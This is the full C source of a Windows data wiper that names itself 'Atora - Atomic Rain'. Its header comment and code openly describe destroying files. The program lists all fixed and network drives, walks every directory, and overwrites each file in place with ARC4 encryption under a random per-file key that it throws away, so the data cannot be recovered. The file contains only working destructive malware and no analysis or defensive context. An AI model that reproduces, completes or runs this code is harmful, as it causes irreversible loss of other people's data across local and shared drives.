/*
  Name:             Atora - Atomic Rain.
  Version:          5.19
  Class:            Files shredder for Windows / Wiper.
  What is he doing: Encrypts all files on all local drives with a cipher ARC4
  SHA-256:          9db95e89cd9f3bb41f4e219f2bc4d60a6b0f3fc6b770da960eedf5886882c465
*/
#include <io.h>
#include <time.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define _ERROR        -1
#define _ZERO          0
#define _BYTE        256
#define _BUFFER_SIZE 512

void      arc4(unsigned char * data, short int length);

void      writetrash(unsigned char * data, short int  length);
void      finddir(unsigned char * path, unsigned char * mask);
void      initialized(const unsigned char * key, short int length);
void      swap(unsigned char * a, unsigned char * b);
short int randomrange(short int min, short int max);
short int checklogicaldisk(unsigned char number_disk);
void      fileencrypt(const unsigned char * filename);
void      generatekey(void);

unsigned char * expansion    = "*";
unsigned char * slash        = "\\";
unsigned char * t_one        = ".";
unsigned char * t_two        = "..";

short int size_uc = sizeof(unsigned char); 

short int vi, bi;

unsigned char secret_key [_BYTE]        = {_ZERO};
unsigned char buffer     [_BUFFER_SIZE] = {_ZERO};
unsigned char data       [_BYTE]        = {_ZERO};

int main (void) {
 short int disk;
 time_t real_time;
 unsigned char LOCAL_DISK[] = "+:";
 
 srand(time(&real_time));

 for (disk = 65; disk <= 90; disk++) {
  if (checklogicaldisk((unsigned char)disk) == _ZERO) {
   LOCAL_DISK[_ZERO] = (unsigned char)disk;
   finddir(LOCAL_DISK, expansion);
  }
 }
 
 memset(secret_key, _ZERO, _BYTE);
 return _ZERO;
}

void finddir(unsigned char * path, unsigned char * mask) {
 WIN32_FIND_DATA wfd;
 HANDLE hfound;

 unsigned char newpath[MAX_PATH]  = {_ZERO};
 unsigned char fpath[MAX_PATH]    = {_ZERO};
 unsigned char pathfile[MAX_PATH] = {_ZERO};
 unsigned char delpath[MAX_PATH]  = {_ZERO};

 strcpy(fpath, path);
 strcat(fpath, slash);
 strcpy(delpath, fpath);
 strcat(fpath, mask);

 if ((hfound = FindFirstFile(fpath, &wfd)) != INVALID_HANDLE_VALUE) {
  do {
   if ((wfd.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) && (strcmp(wfd.cFileName, t_two) != _ZERO) && (strcmp(wfd.cFileName, t_one) != _ZERO)) {
    strcpy(pathfile, path);
    strcat(pathfile, slash);
    strcat(pathfile, wfd.cFileName);
    generatekey();
	fileencrypt(pathfile);
   }
  } while (FindNextFile(hfound, &wfd));
 }

 FindClose(hfound);
 strcpy(fpath, path);
 strcat(fpath, slash);
 strcat(fpath, expansion);

 if ((hfound = FindFirstFile(fpath, &wfd)) != INVALID_HANDLE_VALUE) {
  do {
   if ((wfd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(wfd.cFileName, t_two) != _ZERO) && (strcmp(wfd.cFileName, t_one) != _ZERO)) {
    strcpy(newpath, path);
    strcat(newpath, slash);
    strcat(newpath, wfd.cFileName);
    finddir(newpath, mask);
   }
  } while (FindNextFile(hfound, &wfd));
 }
 FindClose(hfound);
}

void generatekey(void) {
 writetrash(data, _BYTE);
 initialized(data, _BYTE);
 memset(data, _ZERO, _BYTE);
}

short int checklogicaldisk(unsigned char number_disk) {
 unsigned char LOGICAL_DISK[] = "+:\\";
 LOGICAL_DISK[_ZERO] = number_disk;

 short int result = (short int)GetDriveType(&LOGICAL_DISK[_ZERO]);
 
 if ((result == DRIVE_FIXED) || (result == DRIVE_REMOTE))
  return _ZERO;
 else
  return _ERROR;
}

short int randomrange(short int min, short int max) {
 return min + rand() % ((max + 1) - min);
}

void writetrash(unsigned char * data, short int length) {
 short int i;

  for (i = _ZERO; i < length; i++)
   data[i] = (unsigned char)randomrange(_ZERO, _BYTE - 1);
}

void fileencrypt(const unsigned char * filename) {
 FILE * f = fopen(filename, "r+b");

  if (f != NULL) {
   fseek(f, _ZERO, SEEK_END);
   long int fsize = ftell(f);
   fseek(f, _ZERO, SEEK_SET);

    if ((fsize != -1L) && (fsize > _ZERO)) {

     long int  position = _ZERO;
     short int realread = _ZERO;

      while (position < fsize) {
       realread = fread(buffer, size_uc, _BUFFER_SIZE, f);

       arc4(buffer, realread);

       fseek(f, position, SEEK_SET);
       fwrite(buffer, size_uc, realread, f);
       fflush(f);

       memset(buffer, _ZERO, _BUFFER_SIZE);
       position += realread;
      }
    }
   fclose(f);
  }
}

void swap (unsigned char * a, unsigned char * b) {
 unsigned char t = *a;

 *a = *b;
 *b = t;
}

void initialized(const unsigned char * key, short int length) {

 for (vi = _ZERO; vi < _BYTE; vi++)
  secret_key[vi] = vi;

 for (vi = bi = _ZERO; vi < _BYTE; vi++) {
  bi = (bi + key[vi % length] + secret_key[vi]) % _BYTE;
  swap(&secret_key[vi], &secret_key[bi]);
 }

 vi = bi = _ZERO;
}

void arc4(unsigned char * data, short int length) {
 register short int z;
  for (z = _ZERO; z < length; z++) {
   vi = (vi + 1) % _BYTE;
   bi = (bi + secret_key[vi]) % _BYTE;

   swap(&secret_key[vi], &secret_key[bi]);

   data[z] ^= secret_key[(secret_key[vi] + secret_key[bi]) % _BYTE];
  }
}